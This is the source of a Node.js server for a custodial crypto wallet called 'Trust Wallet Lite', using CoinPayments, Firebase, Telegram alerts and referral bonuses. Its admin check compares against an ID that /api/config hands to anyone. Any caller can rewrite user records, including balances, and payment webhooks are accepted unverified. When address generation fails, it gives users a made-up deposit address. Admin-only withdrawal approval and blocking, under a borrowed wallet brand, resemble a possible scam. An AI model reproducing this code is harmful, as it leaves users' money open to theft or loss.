// ============================================================================
// TRUST WALLET LITE - BACKEND SERVER (COMPLETE VERSION)
// ============================================================================

const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '/')));

// ====== قراءة جميع Secret Files ======
let ADMIN_ID = null;
let COINPAYMENTS_PUBLIC_KEY = null;
let COINPAYMENTS_PRIVATE_KEY = null;
let BOT_TOKEN = null;
let firebaseKey = null;
let db = null;
let admin = null;

console.log("🔐 Loading secrets from Secret Files...");

// 1. Firebase Service Account
try {
    const firebasePath = '/etc/secrets/firebase-key.json';
    if (fs.existsSync(firebasePath)) {
        firebaseKey = JSON.parse(fs.readFileSync(firebasePath, 'utf8'));
        console.log("✅ Firebase key loaded from Secret File");
    } else {
        const localPath = path.join(__dirname, 'firebase-key.json');
        if (fs.existsSync(localPath)) {
            firebaseKey = JSON.parse(fs.readFileSync(localPath, 'utf8'));
            console.log("✅ Firebase key loaded from local file");
        }
    }
} catch (error) {
    console.error("❌ Error loading Firebase key:", error.message);
}

// 2. Admin Config
try {
    const adminPath = '/etc/secrets/admin-config.json';
    if (fs.existsSync(adminPath)) {
        const adminConfig = JSON.parse(fs.readFileSync(adminPath, 'utf8'));
        ADMIN_ID = adminConfig.admin_id;
        console.log("✅ Admin config loaded, ID:", ADMIN_ID);
    } else {
        ADMIN_ID = process.env.ADMIN_ID || "1653918641";
        if (ADMIN_ID) console.log("✅ Using ADMIN_ID from environment variable:", ADMIN_ID);
    }
} catch (error) {
    console.error("❌ Error loading admin config:", error.message);
    ADMIN_ID = process.env.ADMIN_ID || "1653918641";
}

// 3. CoinPayments Keys
try {
    const coinpaymentsPath = '/etc/secrets/coinpayments-keys.json';
    if (fs.existsSync(coinpaymentsPath)) {
        const coinpaymentsKeys = JSON.parse(fs.readFileSync(coinpaymentsPath, 'utf8'));
        COINPAYMENTS_PUBLIC_KEY = coinpaymentsKeys.public_key;
        COINPAYMENTS_PRIVATE_KEY = coinpaymentsKeys.private_key;
        console.log("✅ CoinPayments keys loaded from Secret File");
    } else {
        COINPAYMENTS_PUBLIC_KEY = process.env.COINPAYMENTS_PUBLIC_KEY || null;
        COINPAYMENTS_PRIVATE_KEY = process.env.COINPAYMENTS_PRIVATE_KEY || null;
        if (COINPAYMENTS_PUBLIC_KEY) console.log("✅ Using CoinPayments keys from environment variables");
    }
} catch (error) {
    console.error("❌ Error loading CoinPayments keys:", error.message);
    COINPAYMENTS_PUBLIC_KEY = process.env.COINPAYMENTS_PUBLIC_KEY || null;
    COINPAYMENTS_PRIVATE_KEY = process.env.COINPAYMENTS_PRIVATE_KEY || null;
}

// 4. Bot Token
try {
    const botPath = '/etc/secrets/bot-config.json';
    if (fs.existsSync(botPath)) {
        const botConfig = JSON.parse(fs.readFileSync(botPath, 'utf8'));
        BOT_TOKEN = botConfig.bot_token;
        console.log("✅ Bot token loaded from Secret File");
    } else {
        BOT_TOKEN = process.env.BOT_TOKEN || null;
        if (BOT_TOKEN) console.log("✅ Using BOT_TOKEN from environment variable");
    }
} catch (error) {
    console.error("❌ Error loading bot token:", error.message);
    BOT_TOKEN = process.env.BOT_TOKEN || null;
}

// ====== FIREBASE ADMIN SDK ======
try {
    admin = require('firebase-admin');
    
    if (firebaseKey && !admin.apps.length) {
        admin.initializeApp({
            credential: admin.credential.cert(firebaseKey),
            projectId: firebaseKey.project_id
        });
        db = admin.firestore();
        console.log("✅ Firebase Admin SDK initialized");
    } else if (!firebaseKey) {
        console.log("⚠️ Firebase key not available, running in demo mode");
        // Demo mode: تخزين مؤقت في الذاكرة
        const memoryStore = new Map();
        db = {
            collection: (name) => ({
                doc: (id) => ({
                    get: async () => {
                        const data = memoryStore.get(`${name}_${id}`);
                        return { exists: !!data, data: () => data };
                    },
                    set: async (data) => {
                        memoryStore.set(`${name}_${id}`, data);
                        console.log(`[DEMO] Saved to ${name}/${id}`);
                    },
                    update: async (data) => {
                        const existing = memoryStore.get(`${name}_${id}`) || {};
                        memoryStore.set(`${name}_${id}`, { ...existing, ...data });
                        console.log(`[DEMO] Updated ${name}/${id}`);
                    }
                }),
                where: () => ({
                    get: async () => ({ empty: true, docs: [] })
                }),
                add: async (data) => {
                    const id = `demo_${Date.now()}`;
                    memoryStore.set(`${name}_${id}`, data);
                    return { id };
                }
            })
        };
    } else {
        console.log("✅ Firebase already initialized");
    }
} catch (error) {
    console.error("❌ Firebase init error:", error.message);
}

// ====== Helper Functions ======

// إرسال إشعار عبر تيليجرام
async function sendTelegramMessage(chatId, message) {
    if (!BOT_TOKEN) {
        console.log("⚠️ Bot token not configured");
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        if (data.ok) {
            console.log(`✅ Telegram message sent to ${chatId}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error("Error sending Telegram message:", error);
        return false;
    }
}

// CoinPayments API
async function callCoinPaymentsAPI(cmd, req = {}) {
    if (!COINPAYMENTS_PUBLIC_KEY || !COINPAYMENTS_PRIVATE_KEY) {
        console.log("⚠️ CoinPayments keys not available");
        return null;
    }
    
    const formData = new URLSearchParams();
    formData.append('cmd', cmd);
    formData.append('key', COINPAYMENTS_PUBLIC_KEY);
    formData.append('version', '1');
    Object.keys(req).forEach(k => formData.append(k, req[k]));
    
    const hmac = crypto.createHmac('sha512', COINPAYMENTS_PRIVATE_KEY);
    hmac.update(formData.toString());
    
    try {
        const response = await fetch('https://www.coinpayments.net/api.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'HMAC': hmac.digest('hex')
            },
            body: formData
        });
        
        const data = await response.json();
        if (data.error !== 'ok') throw new Error(data.error);
        return data.result;
    } catch (error) {
        console.error("CoinPayments API error:", error.message);
        return null;
    }
}

// ====== API ENDPOINTS ======

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'online', 
        firebase: admin?.apps?.length ? 'connected' : 'demo',
        coinpayments: COINPAYMENTS_PUBLIC_KEY ? 'configured' : 'not configured',
        bot: BOT_TOKEN ? 'configured' : 'not configured',
        admin: ADMIN_ID ? 'configured' : 'not configured',
        timestamp: Date.now()
    });
});

// Get config
app.get('/api/config', (req, res) => {
    res.json({
        status: 'ok',
        adminId: ADMIN_ID || '',
        botConfigured: !!BOT_TOKEN,
        coinpaymentsConfigured: !!COINPAYMENTS_PUBLIC_KEY,
        version: '6.0.0'
    });
});

// Create user (مثل REFI)
app.post('/api/users', async (req, res) => {
    try {
        const { userId, userData } = req.body;
        
        console.log("📝 Creating/Updating user:", userId);
        
        if (!db) {
            console.log("⚠️ No database, returning success for demo");
            return res.json({ success: true, userId });
        }
        
        const userRef = db.collection('users').doc(userId);
        const userDoc = await userRef.get();
        
        if (userDoc.exists) {
            await userRef.update({
                ...userData,
                updatedAt: admin.firestore.FieldValue.serverTimestamp(),
                lastActive: admin.firestore.FieldValue.serverTimestamp()
            });
            console.log(`✅ User updated: ${userId}`);
        } else {
            await userRef.set({
                ...userData,
                createdAt: admin.firestore.FieldValue.serverTimestamp(),
                updatedAt: admin.firestore.FieldValue.serverTimestamp(),
                lastActive: admin.firestore.FieldValue.serverTimestamp()
            });
            console.log(`✅ User created: ${userId}`);
            
            if (ADMIN_ID && BOT_TOKEN) {
                await sendTelegramMessage(ADMIN_ID, 
                    `🆕 <b>New User!</b>\n\n🆔 ID: <code>${userId}</code>\n👤 Name: ${userData.userName || 'User'}`
                );
            }
        }
        
        res.json({ success: true, userId });
    } catch (error) {
        console.error('Create user error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get user
app.get('/api/users/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        
        console.log("📂 Getting user:", userId);
        
        if (!db) {
            return res.json({ success: false, error: 'Database not available' });
        }
        
        const doc = await db.collection('users').doc(userId).get();
        
        if (!doc.exists) {
            return res.json({ success: false, error: 'User not found' });
        }
        
        await db.collection('users').doc(userId).update({
            lastActive: admin.firestore.FieldValue.serverTimestamp()
        }).catch(console.error);
        
        res.json({ success: true, data: doc.data() });
    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Update user
app.patch('/api/users/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { updates } = req.body;
        
        console.log("📝 Updating user:", userId);
        
        if (!db) {
            return res.json({ success: true });
        }
        
        const userRef = db.collection('users').doc(userId);
        const userDoc = await userRef.get();
        
        if (!userDoc.exists) {
            await userRef.set({
                ...updates,
                createdAt: admin.firestore.FieldValue.serverTimestamp(),
                updatedAt: admin.firestore.FieldValue.serverTimestamp()
            });
        } else {
            await userRef.update({
                ...updates,
                updatedAt: admin.firestore.FieldValue.serverTimestamp()
            });
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Update user error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Process referral
app.post('/api/referrals', async (req, res) => {
    try {
        const { referrerId, newUserId } = req.body;
        
        console.log("🔗 Processing referral:", referrerId, "->", newUserId);
        
        if (!db) {
            return res.json({ success: true });
        }
        
        const referrerRef = db.collection('users').doc(referrerId);
        const referrer = await referrerRef.get();
        
        if (referrer.exists) {
            const invites = referrer.data().invites || [];
            if (!invites.includes(newUserId)) {
                await referrerRef.update({
                    invites: [...invites, newUserId],
                    inviteCount: (referrer.data().inviteCount || 0) + 1,
                    'balances.USDT': (referrer.data().balances?.USDT || 0) + 25,
                    totalUsdtEarned: (referrer.data().totalUsdtEarned || 0) + 25
                });
                console.log(`✅ Referral: ${referrerId} invited ${newUserId}`);
            }
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Referral error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Create deposit address (مع CoinPayments)
app.post('/api/deposit-address', async (req, res) => {
    try {
        const { userId, currency } = req.body;
        
        console.log("💰 Generating deposit address for:", userId, currency);
        
        let address = null;
        
        if (COINPAYMENTS_PUBLIC_KEY && COINPAYMENTS_PRIVATE_KEY) {
            try {
                const result = await callCoinPaymentsAPI('get_callback_address', {
                    currency: currency,
                    ipn_url: `https://${req.get('host')}/api/ipn/${userId}`,
                    label: `twt_${userId}_${currency}`
                });
                address = result?.address;
                if (address) {
                    console.log(`✅ Generated CoinPayments address: ${address}`);
                }
            } catch (coinError) {
                console.error("CoinPayments error:", coinError.message);
            }
        }
        
        if (!address) {
            address = `0x${userId.slice(-40).padStart(40, '0')}`;
            console.log(`⚠️ Using fallback address: ${address}`);
        }
        
        if (db) {
            const userRef = db.collection('users').doc(userId);
            const userDoc = await userRef.get();
            
            if (userDoc.exists) {
                await userRef.update({
                    depositAddress: address
                });
            } else {
                await userRef.set({
                    userId: userId,
                    depositAddress: address,
                    createdAt: admin.firestore.FieldValue.serverTimestamp()
                });
            }
        }
        
        res.json({ success: true, address });
    } catch (error) {
        console.error('Deposit address error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Add balance (Admin only)
app.post('/api/add-balance', async (req, res) => {
    try {
        const { userId, currency, amount, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        const userRef = db.collection('users').doc(userId);
        const userDoc = await userRef.get();
        
        if (!userDoc.exists) {
            await userRef.set({
                userId: userId,
                balances: { [currency]: amount },
                createdAt: admin.firestore.FieldValue.serverTimestamp()
            });
        } else {
            await userRef.update({
                [`balances.${currency}`]: admin.firestore.FieldValue.increment(amount)
            });
        }
        
        console.log(`✅ Admin added ${amount} ${currency} to ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Add balance error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Remove balance (Admin only)
app.post('/api/remove-balance', async (req, res) => {
    try {
        const { userId, currency, amount, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        const userDoc = await db.collection('users').doc(userId).get();
        
        if (!userDoc.exists) {
            return res.status(404).json({ error: 'User not found' });
        }
        
        const currentBalance = userDoc.data()?.balances?.[currency] || 0;
        
        if (currentBalance < amount) {
            return res.status(400).json({ error: 'Insufficient balance' });
        }
        
        await db.collection('users').doc(userId).update({
            [`balances.${currency}`]: admin.firestore.FieldValue.increment(-amount)
        });
        
        console.log(`✅ Admin removed ${amount} ${currency} from ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Remove balance error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Block user (Admin only)
app.post('/api/block-user', async (req, res) => {
    try {
        const { userId, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        await db.collection('users').doc(userId).update({
            withdrawBlocked: true,
            withdrawBlockedAt: admin.firestore.FieldValue.serverTimestamp(),
            withdrawBlockedBy: ADMIN_ID
        });
        
        console.log(`✅ User ${userId} blocked from withdrawals`);
        res.json({ success: true });
    } catch (error) {
        console.error('Block user error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get pending deposits (Admin only)
app.get('/api/admin/deposits', async (req, res) => {
    try {
        const adminKey = req.query.adminKey;
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json([]);
        }
        
        const snapshot = await db.collection('deposit_requests')
            .where('status', '==', 'pending')
            .orderBy('timestamp', 'desc')
            .get();
        
        const deposits = [];
        snapshot.forEach(doc => {
            deposits.push({ id: doc.id, ...doc.data() });
        });
        
        res.json(deposits);
    } catch (error) {
        console.error('Get deposits error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get pending withdrawals (Admin only)
app.get('/api/admin/withdrawals', async (req, res) => {
    try {
        const adminKey = req.query.adminKey;
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json([]);
        }
        
        const snapshot = await db.collection('withdrawal_requests')
            .where('status', '==', 'pending')
            .orderBy('timestamp', 'desc')
            .get();
        
        const withdrawals = [];
        snapshot.forEach(doc => {
            withdrawals.push({ id: doc.id, ...doc.data() });
        });
        
        res.json(withdrawals);
    } catch (error) {
        console.error('Get withdrawals error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Approve deposit (Admin only)
app.post('/api/approve-deposit', async (req, res) => {
    try {
        const { txId, userId, amount, currency, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        await db.collection('deposit_requests').doc(txId).update({
            status: 'approved',
            approvedAt: admin.firestore.FieldValue.serverTimestamp(),
            approvedBy: ADMIN_ID
        });
        
        const userRef = db.collection('users').doc(userId);
        const userDoc = await userRef.get();
        
        if (!userDoc.exists) {
            await userRef.set({
                userId: userId,
                balances: { [currency]: amount },
                createdAt: admin.firestore.FieldValue.serverTimestamp()
            });
        } else {
            await userRef.update({
                [`balances.${currency}`]: admin.firestore.FieldValue.increment(amount)
            });
        }
        
        if (BOT_TOKEN) {
            await sendTelegramMessage(userId,
                `✅ <b>Deposit Approved!</b>\n\nAmount: ${amount} ${currency}\nYour balance has been updated.`
            );
        }
        
        console.log(`✅ Deposit ${txId} approved for user ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Approve deposit error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Reject deposit (Admin only)
app.post('/api/reject-deposit', async (req, res) => {
    try {
        const { txId, userId, reason, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        await db.collection('deposit_requests').doc(txId).update({
            status: 'rejected',
            reason: reason,
            rejectedAt: admin.firestore.FieldValue.serverTimestamp(),
            rejectedBy: ADMIN_ID
        });
        
        if (BOT_TOKEN) {
            await sendTelegramMessage(userId,
                `❌ <b>Deposit Rejected</b>\n\nReason: ${reason}\nPlease contact support.`
            );
        }
        
        console.log(`❌ Deposit ${txId} rejected for user ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Reject deposit error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Approve withdrawal (Admin only)
app.post('/api/approve-withdrawal', async (req, res) => {
    try {
        const { txId, userId, amount, currency, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        await db.collection('withdrawal_requests').doc(txId).update({
            status: 'approved',
            approvedAt: admin.firestore.FieldValue.serverTimestamp(),
            approvedBy: ADMIN_ID
        });
        
        if (BOT_TOKEN) {
            await sendTelegramMessage(userId,
                `✅ <b>Withdrawal Approved!</b>\n\nAmount: ${amount} ${currency}\nYour withdrawal has been processed.`
            );
        }
        
        console.log(`✅ Withdrawal ${txId} approved for user ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Approve withdrawal error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Reject withdrawal (Admin only)
app.post('/api/reject-withdrawal', async (req, res) => {
    try {
        const { txId, userId, amount, currency, reason, adminKey } = req.body;
        
        if (adminKey !== ADMIN_ID) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        if (!db) {
            return res.json({ success: true });
        }
        
        await db.collection('withdrawal_requests').doc(txId).update({
            status: 'rejected',
            reason: reason,
            rejectedAt: admin.firestore.FieldValue.serverTimestamp(),
            rejectedBy: ADMIN_ID
        });
        
        // إعادة المبلغ للمستخدم
        const userRef = db.collection('users').doc(userId);
        await userRef.update({
            [`balances.${currency}`]: admin.firestore.FieldValue.increment(amount)
        });
        
        if (BOT_TOKEN) {
            await sendTelegramMessage(userId,
                `❌ <b>Withdrawal Rejected</b>\n\nAmount: ${amount} ${currency}\nReason: ${reason}\nFunds have been returned.`
            );
        }
        
        console.log(`❌ Withdrawal ${txId} rejected for user ${userId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Reject withdrawal error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Send notification
app.post('/api/send-notification', async (req, res) => {
    try {
        const { userId, message } = req.body;
        
        if (!BOT_TOKEN) {
            return res.status(500).json({ error: 'Bot not configured' });
        }
        
        const success = await sendTelegramMessage(userId, message);
        res.json({ success });
    } catch (error) {
        console.error('Send notification error:', error);
        res.status(500).json({ error: error.message });
    }
});

// CoinPayments IPN Webhook
app.post('/api/ipn/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const ipnData = req.body;
        
        console.log(`📥 CoinPayments IPN received for user ${userId}:`, ipnData);
        
        if (ipnData.status === 100) {
            const amount = parseFloat(ipnData.amount);
            const currency = ipnData.currency;
            
            if (db) {
                await db.collection('deposit_requests').add({
                    userId,
                    amount,
                    currency,
                    status: 'pending',
                    txId: ipnData.txn_id,
                    timestamp: admin.firestore.FieldValue.serverTimestamp(),
                    source: 'coinpayments'
                });
                
                if (ADMIN_ID && BOT_TOKEN) {
                    await sendTelegramMessage(ADMIN_ID,
                        `💰 <b>New Deposit via CoinPayments!</b>\n\n` +
                        `User: <code>${userId}</code>\n` +
                        `Amount: ${amount} ${currency}\n` +
                        `TXID: ${ipnData.txn_id}`
                    );
                }
            }
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('IPN error:', error);
        res.sendStatus(500);
    }
});

// Serve frontend
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// بدء الخادم
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`🔥 Firebase: ${admin?.apps?.length ? 'Connected' : 'Demo Mode'}`);
    console.log(`👑 Admin ID: ${ADMIN_ID ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`💳 CoinPayments: ${COINPAYMENTS_PUBLIC_KEY ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
});
